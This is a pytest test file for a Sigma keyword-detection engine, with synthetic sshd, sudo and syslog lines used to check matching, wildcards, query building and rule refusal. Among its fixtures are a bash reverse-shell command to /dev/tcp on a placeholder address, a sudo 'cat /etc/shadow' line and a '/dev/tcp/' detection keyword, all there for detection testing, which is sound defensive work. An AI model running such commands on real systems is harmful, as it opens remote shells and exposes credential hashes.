"""Sigma keyword (free-text) detections.

A keyword selection is a bare list of strings searched in the event text -- the usual shape
of Sigma rules for auth / syslog / sshd. Rules and log lines here are synthetic.
"""
from __future__ import annotations

import pytest
import yaml

from app.ingest.artifact_normalizers import normalize_linux_row
from app.ingest.linux.auth import parse_auth
from app.ingest.linux.shell_history import parse_shell_history
from app.ingest.linux.syslog import parse_syslog
from app.ingest.normalizer import base_document
from app.rules_engine.sigma import (
    _keyword_alnum_runs,
    _keyword_candidate_clause,
    _keyword_regex,
    build_sigma_case_profile,
    build_sigma_query_from_compiled,
    compile_sigma_rule,
    evaluate_compiled_sigma_rule,
    evaluate_sigma_rule,
    keyword_selection_issue,
    preflight_sigma_rule,
)

AUTH_LOG = """\
Mar  1 10:20:30 web01 sshd[411]: Failed password for invalid user mallory from 203.0.113.9 port 51234 ssh2
Mar  1 10:20:35 web01 sshd[412]: Accepted publickey for deploy from 198.51.100.7 port 40022 ssh2: ED25519 SHA256:abc
Mar  1 10:21:00 web01 sudo:   alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/bin/cat /etc/shadow
"""


def _doc(row: dict) -> dict:
    family = row["artifact_family"]
    base = base_document("case-1", "ev-1", "art-1", row, {"artifact_type": family})
    return normalize_linux_row(base, row, source_path=row["source_file"], artifact_type=family)


def _auth_docs() -> list[dict]:
    return [_doc(r) for r in parse_auth(AUTH_LOG, source_path="var/log/auth.log")]


def _rule(text: str) -> dict:
    return yaml.safe_load(text)


def _compiled(text: str) -> dict:
    return compile_sigma_rule(_rule(text))


SSH_BRUTE = """
title: SSH failed or invalid login
logsource: {product: linux, service: sshd}
detection:
  keywords:
    - 'Failed password'
    - 'Invalid user'
  condition: keywords
level: medium
"""


# --------------------------------------------------------------- keyword helpers

@pytest.mark.parametrize(
    "keyword, text, expected",
    [
        ("Failed password", "sshd: FAILED PASSWORD for root", True),
        ("failed password", "Accepted password", False),
        ("Failed*invalid user", "Failed password for invalid user bob", True),
        ("Failed*invalid user", "invalid user bob then Failed", False),
        ("sudo?pam", "sudo:pam_unix", True),
        ("sudo?pam", "sudo pam", True),
        ("sudo?pam", "sudopam", False),
        (r"literal\*star", "a literal*star here", True),
        (r"literal\*star", "a literal-anything-star", False),
        ("203.0.113.9", "from 203.0.113.9 port", True),
        ("203.0.113.9", "from 203x0y113z9 port", False),
    ],
)
def test_keyword_matching_is_case_insensitive_substring_with_sigma_wildcards(keyword, text, expected):
    assert bool(_keyword_regex(keyword).search(text)) is expected


@pytest.mark.parametrize("values", [["a"], ["*"], ["**"], ["??"], ["ab"], ["***x**"], [""], ["/:-"], ["1.2.3"], ["a_b-c"], ["Failed password", "x"]])
def test_keywords_with_too_little_text_are_refused(values):
    assert keyword_selection_issue(values) == "keyword_too_broad" or keyword_selection_issue(values) == "empty_keyword"


@pytest.mark.parametrize("values", [["Failed password"], ["su:", "sudo"], ["*Failed*password*"], ["/dev/tcp/"], ["192.0.2.55"]])
def test_reasonable_keywords_are_accepted(values):
    assert keyword_selection_issue(values) is None


def test_empty_and_oversized_lists_are_refused():
    assert keyword_selection_issue([]) == "empty_keyword"
    assert keyword_selection_issue([f"keyword{i}" for i in range(201)]) == "too_many_keywords"


# ---------------------------------------------------------------------- compiling

def test_keyword_only_rule_compiles_instead_of_being_refused():
    compiled = _compiled(SSH_BRUTE)
    assert compiled["compile_status"] == "compiled", compiled.get("compile_error")
    clause = compiled["compiled_query"]["selections"]["keywords"][0]
    assert clause["modifier"] == "keyword" and clause["expected"] == ["Failed password", "Invalid user"]


@pytest.mark.parametrize("keywords", [["a"], ["*"], ["x*"]])
def test_too_broad_keyword_rule_is_refused_not_armed(keywords):
    rule = _rule(SSH_BRUTE)
    rule["detection"]["keywords"] = keywords
    compiled = compile_sigma_rule(rule)
    assert compiled["compile_status"] == "skipped_keyword_too_broad"


def test_a_detection_with_no_keywords_and_no_fields_is_still_refused():
    rule = _rule(SSH_BRUTE)
    rule["detection"]["keywords"] = []
    assert compile_sigma_rule(rule)["compile_status"] != "compiled"


# ---------------------------------------------------------------------- matching

def test_keyword_rule_fires_on_the_matching_auth_line_only():
    failed, accepted, sudo = _auth_docs()
    compiled = _compiled(SSH_BRUTE)
    assert evaluate_compiled_sigma_rule(compiled, failed)["matched"] is True
    assert evaluate_compiled_sigma_rule(compiled, accepted)["matched"] is False
    assert evaluate_compiled_sigma_rule(compiled, sudo)["matched"] is False


def test_legacy_evaluator_agrees():
    failed, accepted, _ = _auth_docs()
    rule = _rule(SSH_BRUTE)
    assert evaluate_sigma_rule(rule, failed)["matched"] is True
    assert evaluate_sigma_rule(rule, accepted)["matched"] is False


def test_wildcard_keyword_rule():
    rule = _rule(SSH_BRUTE)
    rule["detection"]["keywords"] = ["Failed*invalid user*mallory"]
    failed, accepted, _ = _auth_docs()
    compiled = compile_sigma_rule(rule)
    assert evaluate_compiled_sigma_rule(compiled, failed)["matched"] is True
    assert evaluate_compiled_sigma_rule(compiled, accepted)["matched"] is False


def test_keywords_combined_with_a_field_selection_and_not_filter():
    rule = _rule("""
title: Failed login from an outside address
logsource: {product: linux, service: auth}
detection:
  keywords:
    - 'Failed password'
  filter_internal:
    - '198.51.100.7'
  condition: keywords and not filter_internal
""")
    failed = _auth_docs()[0]
    compiled = compile_sigma_rule(rule)
    assert compiled["compile_status"] == "compiled", compiled.get("compile_error")
    assert evaluate_compiled_sigma_rule(compiled, failed)["matched"] is True
    internal = {**failed, "message": failed["message"] + " from 198.51.100.7", "search_text": failed["search_text"] + " 198.51.100.7"}
    assert evaluate_compiled_sigma_rule(compiled, internal)["matched"] is False


def test_one_of_keyword_selections():
    rule = _rule("""
title: Suspicious auth text
logsource: {product: linux, service: auth}
detection:
  keywords_fail:
    - 'Failed password'
  keywords_sudo:
    - 'COMMAND=/bin/cat /etc/shadow'
  condition: 1 of keywords_*
""")
    compiled = compile_sigma_rule(rule)
    assert compiled["compile_status"] == "compiled", compiled.get("compile_error")
    failed, accepted, sudo = _auth_docs()
    assert [evaluate_compiled_sigma_rule(compiled, d)["matched"] for d in (failed, accepted, sudo)] == [True, False, True]


def test_keyword_rule_fires_on_syslog_and_not_on_an_unrelated_family():
    rule = _rule("""
title: Out of memory kill
logsource: {product: linux, service: syslog}
detection:
  keywords:
    - 'Out of memory: Killed process'
  condition: keywords
""")
    compiled = compile_sigma_rule(rule)
    syslog = _doc(parse_syslog("Mar  1 10:00:00 db01 kernel: Out of memory: Killed process 4242 (mysqld)", source_path="var/log/syslog")[0])
    history = _doc(parse_shell_history("echo 'Out of memory: Killed process'\n", source_path="home/alice/.bash_history")[0])
    assert evaluate_compiled_sigma_rule(compiled, syslog)["matched"] is True
    result = evaluate_compiled_sigma_rule(compiled, history)
    assert result["matched"] is False and result.get("skip_reason") == "logsource_mismatch"


def test_an_sshd_rule_is_not_tested_against_shell_history():
    history = _doc(parse_shell_history("echo Failed password\n", source_path="home/alice/.bash_history")[0])
    result = evaluate_compiled_sigma_rule(_compiled(SSH_BRUTE), history)
    assert result["matched"] is False and result.get("skip_reason") == "logsource_mismatch"


# ---------------------------------------------------------------------- preflight

def test_keyword_rule_is_runnable_on_a_linux_case():
    profile = build_sigma_case_profile(_auth_docs())
    assert preflight_sigma_rule(_rule(SSH_BRUTE), profile)["status"].startswith("runnable")


# ------------------------------------------------- candidate query is a safe superset

@pytest.mark.parametrize(
    "keyword, text",
    [
        ("Failed password", "Failed password for invalid user mallory"),
        ("Failed*invalid user", "sshd[1]: FAILED password for INVALID USER x"),
        ("/dev/tcp/", "bash -i >& /dev/tcp/203.0.113.9/4444"),
        ("203.0.113.9", "from 203.0.113.9 port 22"),
        ("COMMAND=/bin/cat /etc/shadow", "alice : TTY=pts/0 ; COMMAND=/bin/cat /etc/shadow"),
        ("pam_unix(sudo:auth)", "pam_unix(sudo:auth): authentication failure"),
        ("su:", "Mar 1 su: session opened"),
        ("ab_cd-ef", "xx ab_cd-ef yy"),
    ],
)
def test_candidate_clause_never_excludes_a_true_match(keyword, text):
    """Every run the OpenSearch clause demands must occur in any text the keyword matches."""
    assert _keyword_regex(keyword).search(text), "fixture must be a real match"
    clause = _keyword_candidate_clause(keyword)
    wildcards = [c["wildcard"]["search_text"]["value"].strip("*") for c in clause["bool"]["must"]]
    assert wildcards, "a keyword with searchable text must produce at least one run"
    assert all(run in text.lower() for run in wildcards)


def test_candidate_clause_uses_only_literal_alphanumeric_runs():
    assert _keyword_alnum_runs("Failed*invalid user") == ["Failed", "invalid", "user"]
    assert _keyword_alnum_runs("/dev/tcp/") == ["dev", "tcp"]
    clause = _keyword_candidate_clause("Failed*invalid user")
    assert len(clause["bool"]["must"]) <= 3


def test_every_keyword_reaches_the_query_even_past_the_clause_cap():
    rule = _rule(SSH_BRUTE)
    rule["detection"]["keywords"] = [f"marker number {i:03d}" for i in range(120)]
    rule["detection"]["selection"] = {"User": "root"}
    rule["detection"]["condition"] = "keywords or selection"
    query = build_sigma_query_from_compiled(compile_sigma_rule(rule))
    should = query["query"]["bool"]["should"]
    keyword_clauses = [c for c in should if "bool" in c]
    assert len(keyword_clauses) == 120
    assert query["query"]["bool"]["minimum_should_match"] == 1


# ----------------------------------------------------- scope: Linux rules only

def test_keyword_rules_for_other_products_keep_their_earlier_behaviour():
    """Free-text rules for a product Kairon has no parser for must not be armed on every case."""
    for logsource in ({"product": "cisco", "service": "aaa"}, {"product": "windows"}, {"category": "application"}, {}):
        rule = _rule(SSH_BRUTE)
        rule["logsource"] = logsource
        compiled = compile_sigma_rule(rule)
        assert compiled["compile_status"] == "skipped_keyword_only_detection", (logsource, compiled["compile_status"])
